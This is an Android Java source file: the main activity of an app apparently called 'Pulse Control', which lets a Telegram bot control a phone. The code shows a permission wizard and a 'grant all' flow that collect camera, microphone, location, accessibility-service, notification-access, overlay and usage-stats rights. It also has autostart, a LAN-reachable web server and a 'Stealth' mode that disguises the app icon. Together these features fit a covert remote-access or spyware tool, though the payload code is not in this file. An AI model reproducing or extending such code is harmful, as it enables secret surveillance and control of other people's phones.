package com.pulse.control;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.style.ForegroundColorSpan;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/** Green control panel: status, one-tap permissions, settings, log. */
public class MainActivity extends android.app.Activity implements LogStore.Listener {

    private static MainActivity visible;

    private TextView tvChip, tvStatusTitle, tvStatusBadge, tvBattery, tvNet, tvPing, tvCmds, tvLog;
    private View dotStatus;
    private EditText etToken, etAdmin;
    private Button btnFgs, btnBoot;
    private LinearLayout permList;
    private ScrollView scrollLog;

    private final Handler h = new Handler(Looper.getMainLooper());
    private final ExecutorService pool = Executors.newSingleThreadExecutor();
    private final Runnable tick = new Runnable() {
        @Override public void run() { refresh(); h.postDelayed(this, 3000); }
    };

    public static void pokeUi() {
        MainActivity a = visible;
        if (a != null) a.h.post(a::refresh);
    }

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        bind();
        wire();
        Config cfg = Config.get(this);
        etToken.setText(cfg.token);
        etAdmin.setText(cfg.admin);
        tvChip.setText("● @" + cfg.botUsername);
        tvLog.setText(LogStore.dump());
        LogStore.setListener(this);
        buildPerms();
        requestBasePermissions();
        maybeStart();
    }

    @Override protected void onResume() {
        super.onResume();
        visible = this;
        refresh();
        buildPerms();
        h.post(tick);
        if (wizardIdx > 0 && wizardIdx <= Perms.WIZARD.length) {
            h.postDelayed(this::wizardStep, 800);
        }
    }

    @Override protected void onPause() {
        super.onPause();
        visible = null;
        h.removeCallbacks(tick);
    }

    private void bind() {
        tvChip = findViewById(R.id.tvChip);
        tvStatusTitle = findViewById(R.id.tvStatusTitle);
        tvStatusBadge = findViewById(R.id.tvStatusBadge);
        tvBattery = findViewById(R.id.tvBattery);
        tvNet = findViewById(R.id.tvNet);
        tvPing = findViewById(R.id.tvPing);
        tvCmds = findViewById(R.id.tvCmds);
        tvLog = findViewById(R.id.tvLog);
        dotStatus = findViewById(R.id.dotStatus);
        etToken = findViewById(R.id.etToken);
        etAdmin = findViewById(R.id.etAdmin);
        btnFgs = findViewById(R.id.btnFgs);
        btnBoot = findViewById(R.id.btnBoot);
        permList = findViewById(R.id.permList);
        scrollLog = findViewById(R.id.scrollLog);
    }

    private void wire() {
        findViewById(R.id.btnGrant).setOnClickListener(v -> grantAll());
        applyInsets();
        findViewById(R.id.btnWizard).setOnClickListener(v -> startWizard());
        findViewById(R.id.btnWebApp).setOnClickListener(v -> {
            try {
                startActivity(new Intent(Intent.ACTION_VIEW,
                        Uri.parse("http://127.0.0.1:" + WebServer.port() + "/")));
            } catch (Exception e) { toast("Не удалось открыть браузер"); }
        });
        findViewById(R.id.btnOpenBot).setOnClickListener(v -> openBot());
        findViewById(R.id.btnPing).setOnClickListener(v -> pingBot());
        findViewById(R.id.btnSave).setOnClickListener(v -> {
            Config.save(this, etToken.getText().toString(), etAdmin.getText().toString());
            LogStore.add("💾 Настройки сохранены");
            toast("✔ Сохранено");
            maybeStart();
            BotService.reload(this);
            refresh();
        });
        findViewById(R.id.btnTest).setOnClickListener(v -> sendTest());
        findViewById(R.id.btnGetId).setOnClickListener(v -> showMyId());
        findViewById(R.id.btnA11y).setOnClickListener(v ->
                startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        btnFgs.setOnClickListener(v -> {
            if (isStatusRunning()) { StatusService.stop(this); toast("Служба статуса остановлена"); }
            else { StatusService.start(this); toast("Служба статуса включена"); }
            refresh();
        });
        btnBoot.setOnClickListener(v -> {
            Config.setAutostart(this, !Config.get(this).autostart);
            refresh();
        });
        findViewById(R.id.btnStealth).setOnClickListener(v -> {
            int m = Stealth.next(this);
            toast("🎨 " + Stealth.NAMES[m]);
            btnStealthUpdate();
        });
        findViewById(R.id.btnStealth).setOnLongClickListener(v -> {
            new android.app.AlertDialog.Builder(this)
                    .setTitle("🥷 Режим иконки")
                    .setItems(Stealth.NAMES, (d, w) -> {
                        Stealth.setMode(this, w);
                        toast("🎨 " + Stealth.NAMES[w]);
                        btnStealthUpdate();
                    })
                    .show();
            return true;
        });
    }

    // ------------------------------------------------------------ permissions UI

    private void buildPerms() {
        try {
            permList.removeAllViews();
            List<Perms.Step> steps = Perms.steps(this);
            for (Perms.Step s : steps) {
                LinearLayout row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                row.setGravity(Gravity.CENTER_VERTICAL);
                row.setPadding(dp(8), dp(8), dp(8), dp(8));

                TextView mark = new TextView(this);
                mark.setText("done".equals(s.action) ? "✅" : "⬜");
                mark.setTextSize(18);
                row.addView(mark);

                LinearLayout txt = new LinearLayout(this);
                txt.setOrientation(LinearLayout.VERTICAL);
                LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                        ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
                lp.setMarginStart(dp(10));
                txt.setLayoutParams(lp);

                TextView t1 = new TextView(this);
                t1.setText(s.title);
                t1.setTextColor(Color.parseColor("#E8F7EF"));
                t1.setTextSize(14);
                txt.addView(t1);

                TextView t2 = new TextView(this);
                t2.setText(s.desc);
                t2.setTextColor(Color.parseColor("#7FA894"));
                t2.setTextSize(11);
                txt.addView(t2);
                row.addView(txt);

                if (!"done".equals(s.action)) {
                    Button b = new Button(this);
                    b.setText(buttonText(s.action));
                    b.setTextSize(11);
                    b.setTextColor(Color.parseColor("#00E68A"));
                    b.setBackgroundResource(R.drawable.bg_btn_secondary);
                    b.setAllCaps(false);
                    b.setMinWidth(dp(88));
                    b.setPadding(dp(10), 0, dp(10), 0);
                    b.setOnClickListener(v -> Perms.openSettings(this, s.action));
                    row.addView(b);
                }
                permList.addView(row);
            }
            if (steps.size() == 0) {
                TextView tv = new TextView(this);
                tv.setText("Все разрешения выданы ✔");
                tv.setTextColor(Color.parseColor("#35E08A"));
                tv.setPadding(dp(10), dp(10), dp(10), dp(10));
                permList.addView(tv);
            }
        } catch (Exception ignored) {}
    }

    private String buttonText(String action) {
        switch (action) {
            case "a11y": return "Включить";
            case "battery": return "Разрешить";
            case "overlay": return "Разрешить";
            case "usage": return "Открыть";
            case "notify": return "Открыть";
            case "camera": return "Разрешить";
            case "mic": return "Разрешить";
            case "geo": return "Разрешить";
            default: return "Открыть";
        }
    }

    private int dp(int v) { return (int) (v * getResources().getDisplayMetrics().density); }

    // ------------------------------------------------------------ actions

    private void requestBasePermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            java.util.List<String> need = new java.util.ArrayList<>();
            if (Build.VERSION.SDK_INT >= 33
                    && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                need.add(Manifest.permission.POST_NOTIFICATIONS);
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
                need.add(Manifest.permission.CAMERA);
            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
                need.add(Manifest.permission.RECORD_AUDIO);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
                need.add(Manifest.permission.ACCESS_FINE_LOCATION);
            if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), 7);
        }
    }

    // ------------------------------------------------------------ permission wizard

    private int wizardIdx = 0;

    private void startWizard() {
        wizardIdx = 0;
        toast("Мастер разрешений: жмите «Далее» на каждом экране");
        wizardStep();
    }

    private void wizardStep() {
        try {
            List<Perms.Step> steps = Perms.steps(this);
            String[] order = Perms.WIZARD;
            while (wizardIdx < order.length) {
                String key = order[wizardIdx];
                String state = actionFor(steps, key);
                if ("done".equals(state) || state == null) { wizardIdx++; continue; }
                toast("Шаг " + (wizardIdx + 1) + "/" + order.length + ": " + titleFor(key));
                if (isRuntimePerm(key)) {
                    requestPermissions(new String[]{permFor(key)}, 70 + wizardIdx);
                } else {
                    Perms.openSettings(this, state);
                }
                wizardIdx++;
                return;
            }
            toast("✅ Все разрешения пройдены!");
            buildPerms();
            refresh();
        } catch (Exception e) {
            toast("Мастер: " + e.getMessage());
        }
    }

    private boolean isRuntimePerm(String key) {
        return key.equals("camera") || key.equals("mic") || key.equals("geo") || key.equals("notif");
    }

    private String permFor(String key) {
        switch (key) {
            case "camera": return Manifest.permission.CAMERA;
            case "mic": return Manifest.permission.RECORD_AUDIO;
            case "geo": return Manifest.permission.ACCESS_FINE_LOCATION;
            default: return Manifest.permission.POST_NOTIFICATIONS;
        }
    }

    private String titleFor(String key) {
        switch (key) {
            case "notif": return "уведомления";
            case "camera": return "камера";
            case "mic": return "микрофон";
            case "geo": return "геолокация";
            case "overlay": return "поверх окон";
            case "battery": return "батарея";
            case "notify": return "доступ к уведомлениям";
            case "usage": return "статистика";
            default: return "служба доступа";
        }
    }

    private String actionFor(List<Perms.Step> steps, String key) {
        for (Perms.Step s : steps) {
            if (s.action.equals("done")) continue;
            if (matches(s.action, key)) return s.action;
        }
        return "done";
    }

    private boolean matches(String action, String key) {
        switch (key) {
            case "notif": return action.equals("notif");
            case "camera": return action.equals("camera");
            case "mic": return action.equals("mic");
            case "geo": return action.equals("geo");
            case "overlay": return action.equals("overlay");
            case "battery": return action.equals("battery");
            case "notify": return action.equals("notify");
            case "usage": return action.equals("usage");
            case "a11y": return action.equals("a11y");
            default: return false;
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        if (code >= 70) h.postDelayed(this::wizardStep, 600);
        else buildPerms();
    }

    private void grantAll() {
        requestBasePermissions();
        if (!isStatusRunning()) StatusService.start(this);
        if (!Perms.isA11yOn(this)) {
            toast("Включите «Pulse Control» в списке служб");
            startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }
        try { Perms.openSettings(this, "notify"); } catch (Exception ignored) {}
        try { Perms.openSettings(this, "overlay"); } catch (Exception ignored) {}
        try { Perms.openSettings(this, "battery"); } catch (Exception ignored) {}
        h.postDelayed(() -> {
            maybeStart();
            refresh();
            buildPerms();
        }, 1500);
    }

    private void openBot() {
        Config cfg = Config.get(this);
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/" + cfg.botUsername)));
        } catch (Exception e) {
            try { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/BotFather"))); }
            catch (Exception ignored) {}
        }
    }

    private void pingBot() {
        Config cfg = Config.get(this);
        if (!cfg.tokenOk()) { toast("Сначала сохраните корректный токен"); return; }
        toast("Проверяю связь…");
        pool.execute(() -> {
            long t0 = System.currentTimeMillis();
            Http.Resp r = new TgApi(cfg.token).getMe();
            long dt = System.currentTimeMillis() - t0;
            runOnUiThread(() -> {
                if (r.ok()) {
                    try {
                        JSONObject res = new JSONObject(r.body).getJSONObject("result");
                        Config.setBotUsername(this, res.optString("username", cfg.botUsername));
                        BotService.lastPing = (int) dt;
                        LogStore.add("✅ Бот отвечает · " + dt + " мс");
                        toast("✅ @" + res.optString("username"));
                    } catch (Exception e) { toast("✅ Бот отвечает"); }
                } else {
                    LogStore.add("❌ " + r.description());
                    toast("❌ " + r.description());
                }
                refresh();
            });
        });
    }

    private void sendTest() {
        Config cfg = Config.get(this);
        if (!cfg.tokenOk() || cfg.adminId() == 0) { toast("Проверьте токен и Admin ID"); return; }
        toast("Отправляю тест…");
        pool.execute(() -> {
            Http.Resp r = new TgApi(cfg.token).sendMessage(cfg.adminId(),
                    "🟢 <b>Pulse Control v2.0</b>\n\nСвязь с телефоном работает.\nОткройте /menu — там весь пульт.",
                    Kb.main());
            runOnUiThread(() -> {
                if (r.ok()) { LogStore.add("✅ Тест отправлен"); toast("✅ Смотрите Telegram"); openBot(); }
                else { LogStore.add("❌ " + r.description()); toast("❌ " + r.description()); }
            });
        });
    }

    private void showMyId() {
        Config cfg = Config.get(this);
        if (!cfg.tokenOk()) { toast("Сначала сохраните токен"); return; }
        toast("Ищу ваш ID…");
        pool.execute(() -> {
            TgApi api = new TgApi(cfg.token);
            long lastId = 0;
            String name = null;
            for (int i = 0; i < 2 && name == null; i++) {
                Http.Resp r = api.getUpdates(Config.getOffset(this), 8);
                if (!r.ok()) break;
                try {
                    org.json.JSONArray arr = new JSONObject(r.body).getJSONArray("result");
                    for (int k = 0; k < arr.length(); k++) {
                        JSONObject u = arr.getJSONObject(k);
                        lastId = Math.max(lastId, u.optLong("update_id") + 1);
                        JSONObject from = null;
                        if (u.has("message")) from = u.getJSONObject("message").optJSONObject("from");
                        else if (u.has("callback_query")) from = u.getJSONObject("callback_query").optJSONObject("from");
                        if (from != null) name = from.optLong("id") + " (" + from.optString("first_name", "") + ")";
                    }
                    if (lastId > 0) Config.setOffset(this, lastId);
                } catch (Exception ignored) {}
                if (name == null) try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
            }
            final String found = name;
            runOnUiThread(() -> {
                if (found == null) toast("Напишите боту /id и повторите");
                else {
                    String idOnly = found.split(" ")[0];
                    etAdmin.setText(idOnly);
                    Config.save(this, etToken.getText().toString(), idOnly);
                    LogStore.add("🆔 Найден ID: " + found);
                    toast("🆔 " + found);
                }
            });
        });
    }

    // ------------------------------------------------------------ state

    private void maybeStart() {
        Config cfg = Config.get(this);
        if (!cfg.tokenOk()) return;
        if (!Perms.isA11yOn(this)) return;
        if (!isStatusRunning()) {
            try { StatusService.start(this); } catch (Exception ignored) {}
        }
        if (!BotService.isUp() && BotService.isServiceOn()) BotService.reload(this);
    }

    private boolean isStatusRunning() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            for (android.app.ActivityManager.RunningServiceInfo ri : am.getRunningServices(Integer.MAX_VALUE)) {
                if (ri.service.getClassName().equals(StatusService.class.getName())) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void refresh() {
        boolean svc = BotService.isServiceOn();
        boolean up = BotService.isUp();
        if (up) {
            tvStatusTitle.setText("Бот на связи");
            tvStatusBadge.setText("ONLINE");
            tvStatusBadge.setTextColor(0xFF35E08A);
            dotStatus.setBackgroundResource(R.drawable.dot_on);
        } else if (svc) {
            tvStatusTitle.setText("Бот подключается…");
            tvStatusBadge.setText("SYNC");
            tvStatusBadge.setTextColor(0xFFFFC65C);
            dotStatus.setBackgroundResource(R.drawable.dot_off);
        } else {
            tvStatusTitle.setText("Служба доступа выключена");
            tvStatusBadge.setText("OFF");
            tvStatusBadge.setTextColor(0xFF7FA894);
            dotStatus.setBackgroundResource(R.drawable.dot_off);
        }
        int pct = Sys.batteryPercent(this);
        tvBattery.setText(pct + "%" + (Sys.charging(this) ? " ⚡" : ""));
        tvNet.setText(Sys.netName(this));
        tvPing.setText(BotService.lastPing >= 0 ? BotService.lastPing + " мс" : "—");
        tvCmds.setText(String.valueOf(BotService.cmdCount));
        btnStealthUpdate();
        try {
            ((android.widget.TextView) findViewById(R.id.tvWebAddr)).setText(
                    "http://127.0.0.1:" + WebServer.port() + "   ·   http://" + WebServer.lanIp() + ":" + WebServer.port());
        } catch (Exception ignored) {}
        btnFgs.setText(isStatusRunning() ? "Выключить" : "Включить");
        btnBoot.setText(Config.get(this).autostart ? "Вкл ✓" : "Выкл");
        tvChip.setText("● @" + Config.get(this).botUsername);
    }

    @Override
    public void onLog(String line) {
        tvLog.append("\n" + line);
        scrollLog.post(() -> scrollLog.fullScroll(View.FOCUS_DOWN));
        boolean isErr = line.contains("❌") || line.contains("⛔") || line.contains("⚠️");
        SpannableString ss = new SpannableString(tvLog.getText());
        String all = tvLog.getText().toString();
        int start = all.lastIndexOf('\n') + 1;
        if (start < all.length()) {
            ss.setSpan(new ForegroundColorSpan(isErr ? 0xFFFF8A8A : 0xFF8FC6A8),
                    start, all.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        }
        tvLog.setText(ss);
    }

    private void btnStealthUpdate() {
        try {
            Button b = findViewById(R.id.btnStealth);
            if (b != null) b.setText(Stealth.describe(this) + " ›");
        } catch (Exception ignored) {}
    }

    /**
     * Android 15/16 принудительно включает edge-to-edge.
     * Добавляем отступы, иначе контент уезжает под статус-бар и панель навигации.
     */
    private void applyInsets() {
        try {
            android.view.View root = findViewById(android.R.id.content);
            if (root == null) return;
            final int basePad = root.getPaddingTop();
            root.setOnApplyWindowInsetsListener((v, insets) -> {
                int top, bottom;
                if (android.os.Build.VERSION.SDK_INT >= 30) {
                    android.graphics.Insets bars = insets.getInsets(
                            android.view.WindowInsets.Type.systemBars()
                                    | android.view.WindowInsets.Type.displayCutout());
                    top = bars.top;
                    bottom = bars.bottom;
                } else {
                    top = insets.getSystemWindowInsetTop();
                    bottom = insets.getSystemWindowInsetBottom();
                }
                v.setPadding(v.getPaddingLeft(), basePad + top,
                        v.getPaddingRight(), bottom);
                return insets;
            });
            root.requestApplyInsets();
        } catch (Throwable ignored) {}
    }

    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_SHORT).show(); }
}
